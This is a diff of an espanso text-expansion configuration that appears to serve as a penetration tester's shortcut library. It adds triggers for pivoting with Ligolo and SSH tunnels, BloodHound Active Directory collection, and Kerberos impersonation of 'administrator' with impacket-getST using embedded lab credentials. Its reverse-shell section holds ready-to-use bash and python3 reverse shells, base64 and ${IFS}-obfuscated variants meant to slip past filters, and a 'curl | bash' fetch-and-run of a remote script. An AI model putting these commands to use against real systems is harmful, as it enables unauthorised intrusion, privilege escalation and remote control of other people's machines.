@@ -4,6 +4,11 @@ global_vars:
     params:
       cmd: ifconfig | awk '/^tun0/ { iface = $1; getline; sub("addr:", ""); print $2 }'
 
+  - name: REV_SHELL
+    type: shell
+    params:
+      cmd:
+
   - name: RHOST
     type: shell
     params:
@@ -27,6 +32,34 @@ matches:
 
   - trigger: ":help"
     replace: "code ~/.config/espanso/match/base.yml"
+
+  - trigger: ":analyze_image"
+    replace: sudo sh -c "$(curl -fs https://www.aperisolve.com/install.sh)" && aperisolve <file>
+
+  ### Ligolo
+  - trigger: ":lig_tap"
+    replace: sudo ip tuntap add user vagrant mode tun ligolo
+
+  - trigger: ":lig_tun"
+    replace: sudo ip link set ligolo up
+
+  - trigger: ":lig_cidr"
+    replace: sudo ip route add 192.168.0.0/24 dev ligolo
+
+  - trigger: ":lig_proxy"
+    replace: ./proxy -selfcert
+
+  - trigger: ":lig_agent"
+    replace: ./agent -connect {{LHOST}}:<port> -ignore-cert
+
+  - trigger: ":ssh_dynamic"
+    replace: ssh -N -D <address to bind to>:<port to bind to> <username>@<SSH server address>
+
+  - trigger: ":ssh_local"
+    replace: ssh -N -L [bind_address:]port:host:hostport [username@address]
+
+  - trigger: ":ssh_remote"
+    replace: ssh -N -R [bind_address:]port:host:hostport [username@address]
 
   #### Others
   - trigger: ":msfconsole"
@@ -69,6 +102,9 @@ matches:
       $cred = New-Object System.Management.Automation.PSCredential($user,$password)
       Enter-PSSession -ComputerName  -Credential $cred -Authentication Negotiate
 
+  - trigger: ":dig"
+    replace: dig +noall +answer +multiline brainmoustache.ca any
+
   - trigger: ":evil-winrm"
     replace: evil-winrm -u <user> -p <password> -i <ip>
 
@@ -80,12 +116,21 @@ matches:
       | winrm |  HOST & HTTP  |
       -----------------------"
 
-  # For dcsync
+  #### For dcsync
   - trigger: ":krb_constrained"
-    replace: impacket-getST -spn 'CIFS/dc.painters.htb' -impersonate 'administrator' -altservice 'ldap' 'PAINTERS.HTB/blake:newP@ssword2022' -dc-ip 192.168.110.55
+    replace: impacket-getST -spn 'CIFS/dc.brainmoustache.lan' -impersonate 'administrator' -altservice 'ldap' 'BRAINMOUSTACHE.LAN/brain:newP@ssword2022' -dc-ip 192.168.110.55
 
   - trigger: ":krb_export"
     replace: export KRB5CCNAME=xx.ccache
+
+  - trigger: ":wireshark_remote"
+    replace: sudo root@ip_add "sudo -S tcpdump -U -w - -i wlan0mon | sudo wireshark -k -i -"
+
+  #### Bloodhound
+  - trigger: ":bloodhound_python"
+    replace: |
+      sudo docker run -v ${PWD}:/bloodhound-data -it bloodhound
+      bloodhound-python -u '' -d '' -p '' -dc dc.brainmoustache.lan -ns 10.0.0.13 -c all
 
   #### Donpapi
   - trigger: ":donpapi_domain"
@@ -171,6 +216,33 @@ matches:
   #### Reverse shell
   - trigger: ":rev_bash"
     replace: /bin/bash -i >& /dev/tcp/{{LHOST}}/{{LPORT}} 0>&1
+
+  - trigger: ":rev_ifs"
+    replace: "{{rev_ifsbash}}"
+    vars:
+      - name: revshell_b64
+        type: shell
+        params:
+          cmd: echo -n "/bin/bash -i >& /dev/tcp/{{LHOST}}/{{LPORT}} 0>&1" | base64
+      - name: rev_ifsbash
+        type: echo
+        params:
+          echo: echo${IFS}{{revshell_b64}}${IFS}|${IFS}base64${IFS}-d${IFS}|${IFS}bash
+
+  - trigger: ":rev_b64"
+    replace: "{{rev_ifsbash}}"
+    vars:
+      - name: revshell_b64
+        type: shell
+        params:
+          cmd: echo -n "/bin/bash -i >& /dev/tcp/{{LHOST}}/{{LPORT}} 0>&1" | base64
+      - name: rev_ifsbash
+        type: echo
+        params:
+          echo: echo -n {{revshell_b64}} | base64 -d | bash
+
+  - trigger: ":rev_curl"
+    replace: curl http://{{LHOST}}/rev.sh | bash
 
   - trigger: ":rev_python3"
     replace: export RHOST="{{LHOST}}";export RPORT={{LPORT}};python3 -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/bash")'
